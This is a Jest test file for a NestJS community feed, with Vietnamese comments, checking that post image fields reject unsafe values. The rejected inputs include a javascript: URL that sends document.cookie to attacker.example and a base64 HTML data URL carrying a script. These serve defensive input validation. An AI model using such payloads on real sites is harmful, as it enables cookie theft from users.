import 'reflect-metadata';
import { ValidationPipe } from '@nestjs/common';
import { CreatePostDto, EditPostDto } from './community-feed.controller';

/** Đúng cấu hình ValidationPipe toàn cục ở main.ts. */
const pipe = new ValidationPipe({ whitelist: true, forbidNonWhitelisted: true, transform: true });
const asCreate = (value: Record<string, unknown>) =>
  pipe.transform(value, { type: 'body', metatype: CreatePostDto, data: undefined });
const asEdit = (value: Record<string, unknown>) =>
  pipe.transform(value, { type: 'body', metatype: EditPostDto, data: undefined });

const JPEG_DATA_URL = `data:image/jpeg;base64,${'A'.repeat(300_000)}==`;

// ENGAGE-7: images chỉ @IsString nên một bài nhận được bất kỳ chuỗi nào (tới 10MB/body): feed nặng hàng MB, và
// chuỗi "javascript:" cũng được lưu để hiển thị lại cho người khác.
describe('CreatePostDto/EditPostDto.images (ENGAGE-7)', () => {
  it('nhận ảnh base64 nén và URL Cloudinary, tối đa 6 ảnh', async () => {
    const images = [JPEG_DATA_URL, 'https://res.cloudinary.com/demo/image/upload/v1/feed/a.jpg'];
    await expect(asCreate({ body: 'Chia sẻ', images })).resolves.toBeDefined();
    await expect(asEdit({ images })).resolves.toBeDefined();
    await expect(asCreate({ body: 'Chia sẻ', images: Array(6).fill(JPEG_DATA_URL) })).resolves.toBeDefined();
  });

  it.each([
    ["javascript:fetch('https://attacker.example/x?'+document.cookie)"],
    ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
    ['data:image/svg+xml;base64,PHN2Zz48L3N2Zz4='],
    ['https://attacker.example/a.jpg'],
    ['không phải ảnh'],
  ])('từ chối ảnh không an toàn %s (tạo và sửa bài)', async (img) => {
    await expect(asCreate({ body: 'Chia sẻ', images: [img] })).rejects.toThrow();
    await expect(asEdit({ images: [img] })).rejects.toThrow();
  });

  it('từ chối ảnh base64 hơn 1.000.000 ký tự (chống một bài làm nặng cả feed) và quá 6 ảnh', async () => {
    const huge = `data:image/jpeg;base64,${'A'.repeat(1_100_000)}`;
    await expect(asCreate({ body: 'Chia sẻ', images: [huge] })).rejects.toThrow();
    await expect(asEdit({ images: [huge] })).rejects.toThrow();
    await expect(asCreate({ body: 'Chia sẻ', images: Array(7).fill(JPEG_DATA_URL) })).rejects.toThrow();
  });
});
